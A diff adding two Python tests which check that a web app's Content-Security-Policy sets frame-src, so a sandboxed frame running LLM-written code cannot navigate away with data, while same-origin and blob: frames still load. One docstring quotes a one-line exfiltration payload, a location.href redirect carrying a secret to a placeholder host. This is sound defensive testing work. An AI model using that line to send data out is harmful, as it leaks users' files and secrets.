@@ -72,6 +72,33 @@ def test_hashed_asset_is_not_no_cache(tmp_path: Path):
     assert resp.headers.get("cache-control") != "no-cache"
 
 
+def test_index_declares_frame_src_so_a_child_frame_cannot_navigate_away(tmp_path: Path):
+    """A WUI runs LLM-written code in a sandboxed frame with its own
+    `default-src 'none'`. That stops it fetching, but CSP has no directive a
+    document can use to stop ITSELF navigating — `navigate-to` was dropped and
+    never shipped — so `location.href = "https://x/?d=" + secret` walked
+    everything `readFile` can reach straight out, measured in Chromium.
+
+    A child frame's navigation is governed by the CONTAINING document's
+    `frame-src`, which is why this belongs here and not in the frame. One
+    directive only: it restricts nothing else on the page."""
+    client = _client(tmp_path)
+    for path in ("/", "/a/rca/items/abc-123"):  # direct and via the history fallback
+        csp = client.get(path).headers.get("content-security-policy")
+        assert csp is not None, path
+        assert "frame-src" in csp
+
+
+def test_frame_src_still_admits_the_frames_the_app_itself_uses(tmp_path: Path):
+    """Every iframe the app mounts is same-origin (a PDF preview, a KB blob) or
+    `srcdoc`. A policy that locked those out would trade an exfiltration hole
+    for a blank document viewer."""
+    csp = _client(tmp_path).get("/").headers["content-security-policy"]
+    frame_src = next(d for d in csp.split(";") if d.strip().startswith("frame-src"))
+    assert "'self'" in frame_src
+    assert "blob:" in frame_src
+
+
 def test_unknown_api_route_still_404s_json(tmp_path: Path):
     """An /api/* path that matches NO route falls through to the SPA mount, but
     the `api/` guard makes it 404 rather than serving index.html (#177) — an API
